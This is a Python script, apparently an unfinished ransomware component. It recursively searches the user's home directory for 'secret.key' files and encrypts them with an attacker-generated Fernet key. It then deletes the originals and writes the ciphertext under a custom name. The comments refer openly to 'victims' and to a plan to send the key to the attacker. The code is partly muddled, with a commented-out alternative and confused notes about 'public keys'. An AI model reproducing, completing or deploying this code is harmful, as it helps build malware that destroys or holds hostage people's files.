#### we want to open our victims key, make our key, and encrypt the victim's key with ours, then send it to the victim.

#############[Packages]#############
###### cryptography package has our Fernet Symetric Encryption
######  ↳ AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
######    HMAC using SHA256 for authentication.
from cryptography.fernet import Fernet
import os
import glob #finds all the pathnames matching a specified pattern
####################################



############[Directory Setup]############
homeDir = os.path.expanduser('~') #grabs user home directory
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to decrypt   
                                                       #we can switch / for linux to \\ for windows
#########################################



############[Targeting Files]############
important = [] #where we store our key? work in progress
for filename in files:
    if "secret.key" in filename:
        important.append(filename)
        print ("I see you got a secret.key, let me encrypt it for you...")
   
    ## vvvvvvvvvvv below used to be an if statement right underneath for loop 
   # else:
        #print ("I couldn't find the victim's secret.key, did you put it in your home folder?")
#########################################



############[Keygen]############        #need to find a way to send this to attacker
###### reading the victim's secret
file = open('secret.key', 'rb')
seckey = file.read()
file.close()
print(f'orignal key is {seckey}')

###### making our key ###double check, probably have to rethink this
###make our key, then we encrypt the secret.key useing our encrypt function, then we 
fern_key = Fernet.generate_key()
myKey = open("temp.key", "wb") #public key?
myKey.write(fern_key) #write fern_key data to myKey, myKey has fernet data now
myKey.close()
print(f'the value of my key is {myKey}')
fernet = Fernet(fern_key) #Supply Fernet with our Key



###idea 1 vvvvvv
"""fern_key = Fernet.generate_key() ###maybe put key inside
#pubKey = open(key, "wb") ## we read the bites of the secret.key, now we write it to the pubKey, which we 
pubKey = open(key, "wb")
pubKey.write(fern_key) ## maybe write to secret key
print(pubKey)#debug
#might not need   file.write(fern_key) ##write the victim's secret with our public secret

file.close()
key.close()
#fernet = Fernet(fern_key) #Supply Fernet with our Key,   need to send this to attacker somehow
"""



############[Encrypting Files]############
for file in important:
    fileName = str(file)
    extension = os.path.splitext(file)[1]  #gets extension
    
    with open(file, 'rb') as f:
        f_bytes=f.read()
    
    f_bytes_encrypted = fernet.encrypt(f_bytes)
    print(f'We encrypted the Victims {file} with our public key')
    os.remove(file) #Removes our old unencrypted file
    
    fileNamePub = 'public'    #This is just for fun, adds a Custom Extension
    encFile = fileNamePub + extension  #Builds our Encrytped file with it's name + our Custom Extension
    
    with open(encFile, 'wb') as f:      
        f.write(f_bytes_encrypted)      #Writes the Encrypted bytes to our Encrypted file.
                                        # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
##########################################



